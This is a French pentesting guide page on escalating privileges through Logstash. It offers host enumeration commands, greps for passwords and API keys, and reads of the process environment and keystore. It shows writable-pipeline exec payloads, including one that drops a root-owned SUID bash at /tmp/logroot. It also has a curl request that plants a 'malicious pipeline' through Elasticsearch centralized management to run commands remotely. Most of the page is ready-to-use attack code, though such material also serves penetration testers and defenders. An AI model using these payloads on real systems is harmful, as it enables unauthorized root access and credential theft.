# Escalade de privilèges Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash est utilisé pour **collecter, transformer et transmettre les logs** au moyen d’un système appelé **pipelines**. Ces pipelines sont composés d’étapes **input**, **filter** et **output**.<sup>[[4]](#references)</sup> Un aspect intéressant apparaît lorsque Logstash s’exécute sur une machine compromise.

### Configuration des pipelines

Dans les installations de paquets Debian et RPM, les pipelines sont configurés via **/etc/logstash/pipelines.yml**, qui répertorie les emplacements des configurations des pipelines ; les autres distributions placent `pipelines.yml` dans le répertoire `path.settings` de Logstash.<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Ce fichier révèle où se trouvent les fichiers **.conf** contenant les configurations des pipelines. Lorsqu'un **Elasticsearch output** est utilisé, inspectez ses paramètres `user`/`password`, `cloud_auth` ou `api_key` ; les privilèges effectifs du compte dépendent d'Elasticsearch. Un glob `path.config` charge chaque fichier correspondant pour ce pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Si Logstash est démarré avec `-f <directory>` au lieu de `pipelines.yml`, `-f` est prioritaire et **tous les fichiers de ce répertoire sont concaténés dans l'ordre lexicographique, puis analysés comme une seule configuration**.<sup>[[6]](#references)[[7]](#references)</sup> Cela crée 2 implications offensives :

- Un fichier ajouté tel que `000-input.conf` ou `zzz-output.conf` peut modifier l'assemblage final du pipeline
- Un fichier malformé peut faire échouer la validation de la configuration combinée ; lors du reload, Logstash conserve le pipeline précédent. Validez donc les payloads avant de compter sur l'auto-reload.<sup>[[1]](#references)</sup>

### Énumération rapide sur un hôte compromis

Sur une machine où Logstash est installé, inspectez rapidement :
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Vérifiez également si l’API de monitoring locale est accessible. Par défaut, elle écoute sur **127.0.0.1:9600**, ce qui est généralement suffisant après avoir obtenu un accès à l’hôte.<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Ces endpoints exposent les IDs et les paramètres des pipelines, les métriques d’exécution ainsi que les compteurs de réussite/échec du rechargement de la configuration, ce qui permet de confirmer si une modification a été acceptée.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Si un credential récupéré cible **Elasticsearch**, consultez [cette autre page sur Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Pour tenter une privilege escalation, identifiez d’abord l’utilisateur sous lequel le service Logstash s’exécute réellement ; ne supposez pas qu’il s’agit de root ou de l’utilisateur **logstash**. Vous devez remplir **l’un** de ces critères :

- Disposer d’un **accès en écriture** à un fichier **.conf** de pipeline **ou**
- Le fichier **/etc/logstash/pipelines.yml** utilise un wildcard, et vous pouvez écrire dans le dossier cible.<sup>[[6]](#references)[[7]](#references)</sup>

De plus, **l’une** de ces conditions doit être remplie :

- Pouvoir redémarrer le service Logstash **ou**
- Le fichier **/etc/logstash/logstash.yml** définit **config.reload.automatic: true**.<sup>[[1]](#references)[[15]](#references)</sup>

Lorsqu’un wildcard est présent dans la configuration, créer un fichier correspondant à ce wildcard permet l’exécution de commandes.<sup>[[7]](#references)[[9]](#references)</sup> Par exemple :
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Ici, **interval** détermine la fréquence d’exécution en secondes. Dans l’exemple donné, la commande **whoami** s’exécute toutes les 120 secondes et sa sortie est redirigée vers **/tmp/output.log**.<sup>[[9]](#references)</sup>

Avec **config.reload.automatic: true** dans **/etc/logstash/logstash.yml**, Logstash détecte et applique automatiquement les configurations de pipeline nouvelles ou modifiées sans nécessiter de redémarrage.<sup>[[1]](#references)[[15]](#references)</sup> En l’absence de wildcard, il est toujours possible de modifier les configurations existantes, mais il est recommandé de faire preuve de prudence afin d’éviter les interruptions.

### Payloads de pipeline plus fiables

Le plugin d’entrée `exec` fonctionne toujours dans les versions actuelles et nécessite soit un **interval**, soit un **schedule**. Il s’exécute en **forkant** la JVM de Logstash ; si la mémoire est limitée, votre payload peut échouer avec `ENOMEM` au lieu de s’exécuter silencieusement.<sup>[[9]](#references)</sup>

Lorsque le service dispose de privilèges suffisants pour créer un fichier SUID appartenant à root, un payload pratique d’escalade de privilèges consiste à laisser un artefact durable :
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Si vous n’avez pas les droits de redémarrage, mais pouvez envoyer un signal au processus, Logstash prend également en charge un rechargement déclenché par **SIGHUP** sur les systèmes de type Unix :<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Sachez que tous les plugins ne sont pas compatibles avec le rechargement. Par exemple, l'input **stdin** empêche le rechargement automatique ; ne supposez donc pas que `config.reload.automatic` prendra toujours vos modifications en compte.<sup>[[1]](#references)</sup>

### Vol de secrets depuis Logstash

Avant de vous concentrer uniquement sur l'exécution de code, récupérez les données auxquelles Logstash a déjà accès :

- Des credentials peuvent apparaître dans les outputs `elasticsearch {}`, les URLs/paramètres de `http_poller`, les inputs JDBC ou les paramètres liés au cloud ; ces plugins exposent des champs de credentials qui méritent d'être recherchés.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Les paramètres sécurisés peuvent se trouver dans **`/etc/logstash/logstash.keystore`** ou dans un autre répertoire `path.settings`.<sup>[[5]](#references)[[10]](#references)</sup>
- Le mot de passe du keystore peut être fourni via **`LOGSTASH_KEYSTORE_PASS`**, et les installations RPM/DEB chargent les variables d'environnement du service depuis **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- L'expansion des variables d'environnement avec `${VAR}` est effectuée au démarrage de Logstash ; l'environnement du service mérite donc d'être inspecté.<sup>[[14]](#references)</sup>

Vérifications utiles :
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Cela vaut également la peine d’être vérifié, car **CVE-2023-46672** a montré que, dans certaines circonstances, Logstash enregistrait des informations sensibles dans ses logs, notamment des secrets stockés dans son keystore et référencés depuis la configuration ; examinez les anciens logs de Logstash et les entrées de `journald` si ces circonstances peuvent s’appliquer.<sup>[[3]](#references)</sup>

### Abus de la gestion centralisée des pipelines

Dans certains environnements, l’hôte ne s’appuie **pas** du tout sur des fichiers `.conf` locaux. Si **`xpack.management.enabled: true`** est configuré, Logstash peut récupérer des pipelines gérés de manière centralisée depuis Elasticsearch/Kibana ; après l’activation de ce mode, les configurations locales des pipelines ne constituent plus la source de vérité.<sup>[[2]](#references)</sup>

Cela implique un autre chemin d’attaque :

1. Récupérer les identifiants Elastic depuis les paramètres locaux de Logstash, le keystore ou les logs.<sup>[[3]](#references)[[10]](#references)</sup>
2. Vérifier si le compte possède le privilège de cluster **`manage_logstash_pipelines`**.<sup>[[16]](#references)</sup>
3. Créer ou remplacer un pipeline géré de manière centralisée afin que l’hôte Logstash exécute votre payload lors de son prochain intervalle d’interrogation.<sup>[[2]](#references)[[16]](#references)</sup>

L’API Elasticsearch utilisée pour cette fonctionnalité est la suivante :<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
Ceci est particulièrement utile lorsque les fichiers locaux sont en lecture seule, mais que Logstash est déjà enregistré pour récupérer des pipelines à distance.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Documentation Elastic : Rechargement du fichier de configuration](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Documentation Elastic : Configurer la gestion centralisée des pipelines](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Mise à jour de sécurité de Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Documentation Elastic : Créer un pipeline Logstash](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Documentation Elastic : Organisation des répertoires de Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Documentation Elastic : Pipelines multiples](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Documentation Elastic : Exécuter Logstash depuis la ligne de commande](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Documentation Elastic : Superviser Logstash avec des API](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Documentation Elastic : plugin d'entrée Exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Documentation Elastic : keystore de secrets pour les paramètres sécurisés](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Documentation Elastic : plugin de sortie Elasticsearch](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Documentation Elastic : plugin d'entrée Http_poller](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Documentation Elastic : plugin d'entrée Jdbc](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Documentation Elastic : Utiliser des variables d'environnement](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Documentation Elastic : logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [API Elasticsearch : Créer ou mettre à jour un pipeline Logstash](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [API Logstash : Obtenir les paramètres des pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [API Logstash : Obtenir les statistiques des pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
